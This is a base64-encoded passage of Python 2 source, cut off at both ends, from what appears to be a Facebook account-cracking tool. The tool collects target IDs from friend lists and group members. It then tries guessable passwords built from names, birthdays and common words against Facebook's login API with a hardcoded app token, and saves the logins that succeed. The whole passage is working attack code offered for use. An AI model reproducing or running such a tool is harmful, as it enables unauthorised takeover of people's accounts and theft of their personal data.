ICJyIikKICAgIHVwID0gYnVrYS5yZWFkKCkuc3BsaXQoKQogICAgd2hpbGUgZmlsZToKICAgICAgdXNlcm5hbWUgPSBmaWxlLnJlYWRsaW5lKCkuc3RyaXAoKQogICAgICB1cmwgPSAiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXJuYW1lKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzdykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIKICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKHVybCkKICAgICAgbXBzaCA9IGpzb24ubG9hZChkYXRhKQogICAgICBpZiBiYWNrID09IChsZW4odXApKToKICAgICAgICBicmVhawogICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOgogICAgICAgIGJpc2EgPSBvcGVuKCJvdXQvbWJmX29rLnR4dCIsICJ3IikKICAgICAgICBiaXNhLndyaXRlKHVzZXJuYW1lKyJ8IitwYXNzdysiXG4iKQogICAgICAgIGJpc2EuY2xvc2UoKQogICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcm5hbWUrIj9hY2Nlc3NfdG9rZW49IittcHNoWydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgYmVyaGFzaWwuYXBwZW5kKCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtT0vinJNcMDMzWzE7OTdtIF0gIit1c2VybmFtZSsifCIgK3Bhc3N3KyIgPT4iK3pbJ25hbWUnXSkKICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CiAgICAgICAgY2VrID0gb3Blbigib3V0L21iZl9jcC50eHQiLCAidyIpCiAgICAgICAgY2VrLndyaXRlKHVzZXJuYW1lKyJ8IitwYXNzdysiXG4iKQogICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgY2VrcG9pbnQuYXBwZW5kKCJcMDMzWzE7OTdtWyBcMDMzWzE7OTNtQ1DinJpcMDMzWzE7OTdtIF0gIit1c2VybmFtZSsifCIgK3Bhc3N3KQogICAgICBlbHNlOgogICAgICAgIGdhZ2FsLmFwcGVuZCh1c2VybmFtZSkKICAgICAgICBiYWNrICs9MQogICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKcuFwwMzNbMTs5MW1dIFwwMzNbMTs5Mm1DcmFjayAgICBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJytzdHIoYmFjaykrJyBcMDMzWzE7OTZtPlwwMzNbMTs5N20gJytzdHIobGVuKHVwKSkrJyA9PlwwMzNbMTs5Mm1MaXZlXDAzM1sxOzkxbTpcMDMzWzE7OTZtJytzdHIobGVuKGJlcmhhc2lsKSkrJyBcMDMzWzE7OTdtPT5cMDMzWzE7OTNtQ2hlY2tcMDMzWzE7OTFtOlwwMzNbMTs5Nm0nK3N0cihsZW4oY2VrcG9pbnQpKSk7c3lzLnN0ZG91dC5mbHVzaCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcblwwMzNbMTs5MW1bIV0gU2xlZXAiCiAgICB0aW1lLnNsZWVwKDEpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICAKZGVmIGhhc2lsKCk6CiAgcHJpbnQKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAjIyNCZXJoYXNpbAogIGZvciBiIGluIGJlcmhhc2lsOgogICAgcHJpbnQoYikKICAjIyNDRUsKICBmb3IgYyBpbiBjZWtwb2ludDoKICAgIHByaW50KGMpCiAgIyMjR2FnYWwKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICBwcmludCAoIlwwMzNbMzFtW3hdIEZhaWxlZCBcMDMzWzE7OTdtLS0+ICIgKyBzdHIobGVuKGdhZ2FsKSkpCiAga2VsdWFyKCkKICAKIyMjIyMjIyMjIyMjIyMjIFNVUEVSIE1CRiAjIyMjIyMjIyMjIyMjIyMjCmRlZiBzdXBlcigpOgogIGdsb2JhbCB0b2tldAogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgcHJpbnQgIlwwMzNbMTs5NW3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Nm0xLlwwMzNbMTs5M20gQ3JhY2sgd2l0aCBsaXN0IGZyaWVuZCIKICBwcmludCAiXDAzM1sxOzk1beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzk2bTIuXDAzM1sxOzkzbSBDcmFjayBmcm9tIGZyaWVuZCIKICBwcmludCAiXDAzM1sxOzk1beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzk2bTMuXDAzM1sxOzkzbSBDcmFjayBmcm9tIG1lbWJlciBncm91cCIKICBwcmludCAiXDAzM1sxOzk1beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzk2bTAuXDAzM1sxOzkzbSBCYWNrIgogIHByaW50ICLilZEiCiAgcGlsaWhfc3VwZXIoKQoKZGVmIHBpbGloX3N1cGVyKCk6CiAgcGVhayA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQogIGlmIHBlYWsgPT0iIjoKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgcGlsaWhfc3VwZXIoKQogIGVsaWYgcGVhayA9PSIxIjoKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgamFsYW4oJ1wwMzNbMTs5NG1b4py6XSBcMDMzWzE7OTZtR2V0IGFsbCBmcmllbmQgaWQgXDAzM1sxOzk1bS4uLicpCiAgICByID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgZm9yIHMgaW4gelsnZGF0YSddOgogICAgICBpZC5hcHBlbmQoc1snaWQnXSkKICBlbGlmIHBlYWsgPT0iMiI6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIGlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQogICAgdHJ5OgogICAgICBqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIG9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkKICAgICAgcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCiAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgIHN1cGVyKCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCiAgICByID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICBmb3IgaSBpbiB6WydkYXRhJ106CiAgICAgIGlkLmFwcGVuZChpWydpZCddKQogIGVsaWYgcGVhayA9PSIzIjoKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgaWRnPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgICB0cnk6CiAgICAgIHI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZGcrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgICAgYXN3PWpzb24ubG9hZHMoci50ZXh0KQogICAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgc3VwZXIoKQogICAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBpZCBcMDMzWzE7OTdtLi4uJykKICAgIHJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZGcrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgIHM9anNvbi5sb2FkcyhyZS50ZXh0KQogICAgZm9yIHAgaW4gc1snZGF0YSddOgogICAgICBpZC5hcHBlbmQocFsnaWQnXSkKICBlbGlmIHBlYWsgPT0iMCI6CiAgICBtZW51X2hhY2soKQogIGVsc2U6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIHBpbGloX3N1cGVyKCkKICAgIAogIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGlkKSkKICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KICBmb3IgbyBpbiB0aXRpazoKICAgIHByaW50KCJcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKcuFwwMzNbMTs5MW1dIFwwMzNbMTs5Mm1DcmFjayBcMDMzWzE7OTdtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkKICBwcmludAogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIAogICAgICAKICAjIyMjIyBjcmFjayAjIyMjIwogIGRlZiBtYWluKGFyZyk6CiAgICBnbG9iYWwgY2VrcG9pbnQsb2tzCiAgICB1c2VyID0gYXJnCiAgICB0cnk6CiAgICAgIG9zLm1rZGlyKCdvdXQnKQogICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgIHBhc3MKICAgIHRyeToKICAgICAgI1Bhc3MxCiAgICAgIGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgICAgYiA9IGpzb24ubG9hZHMoYS50ZXh0KQogICAgICBwYXNzMSA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzJwogICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCiAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgcHJpbnQoIlwwMzNbMTs5M21bIFwwMzNbMTs5M21PS+Kck1wwMzNbMTs5M20gXSAiK3VzZXIrIiDwn5iBICIgK3Bhc3MxKyIgPT4iK3pbJ25hbWUnXSkKICAgICAgICBva3MuYXBwZW5kKHVzZXIrcGFzczEpCiAgICAgIGVsc2U6CiAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgogICAgICAgICAgY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKICAgICAgICAgIGNlay53cml0ZSh1c2VyKyJ8IitwYXNzMSsiXG4iKQogICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgIGNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxKQogICAgICAgIGVsc2U6CiAgICAgICAgICAjUGFzczIKICAgICAgICAgIHBhc3MyID0gYlsnZmlyc3RfbmFtZSddKycxMjM0NScKICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQogICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTNtWyBcMDMzWzE7OTNtT0vinJNcMDMzWzE7OTNtIF0gIit1c2VyKyIg8J+YgSAiICtwYXNzMisiID0+Iit6WyduYW1lJ10pCiAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlcitwYXNzMikKICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQogICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyKyJ8IitwYXNzMisiXG4iKQogICAgICAgICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgICAgICAgY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgI1Bhc3MzCiAgICAgICAgICAgICAgcGFzczMgPSBiWydsYXN0X25hbWUnXSArICcxMjMnCiAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczMpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQogICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCiAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzkzbVsgXDAzM1sxOzkzbU9L4pyTXDAzM1sxOzkzbSBdICIrdXNlcisiIPCfmIEgIiArcGFzczMrIiA9PiIrelsnbmFtZSddKQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyK3Bhc3MzKQogICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CiAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCiAgICAgICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyKyJ8IitwYXNzMysiXG4iKQogICAgICAgICAgICAgICAgICBjZWsuY2xvc2UoKQogICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICNQYXNzNAogICAgICAgICAgICAgICAgICBsYWhpciA9IGJbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgcGFzczQgPSBsYWhpci5yZXBsYWNlKCcvJywgJycpCiAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQogICAgICAgICAgICAgICAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzkzbVsgXDAzM1sxOzkzbU9L4pyTXDAzM1sxOzkzbSBdICIrdXNlcisiIPCfmIEgIiArcGFzczQrIiA9PiIrelsnbmFtZSddKQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlcitwYXNzNCkKICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CiAgICAgICAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQogICAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M0KyJcbiIpCiAgICAgICAgICAgICAgICAgICAgICBjZWsuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICNQYXNzNQogICAgICAgICAgICAgICAgICAgICAgcGFzczUgPSAic2F5YW5nMTIzIgogICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQogICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCiAgICAgICAgICAgICAgICAgICAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5M21bIFwwMzNbMTs5M21PS+Kck1wwMzNbMTs5M20gXSAiK3VzZXIrIiDwn5iBICIgK3Bhc3M1KyIgPT4iK3pbJ25hbWUnXSkKICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyK3Bhc3M1KQogICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgogICAgICAgICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M1KyJcbiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNSkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAjUGFzczYKICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzNiA9ICJrb250b2wxMjMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQogICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzkzbVsgXDAzM1sxOzkzbU9L4pyTXDAzM1sxOzkzbSBdICIrdXNlcisiIPCfmIEgIiArcGFzczYrIiA9PiIrelsnbmFtZSddKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyK3Bhc3M2KQogICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyKyJ8IitwYXNzNisiXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWsuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNQYXNzNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VzZXIrJy8/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIgPSBqc29uLmxvYWRzKGEudGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczcgPSBiWydmaXJzdF9uYW1lJ10rJ2RvcmFlbW9uMzIxJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgICAgICAgIC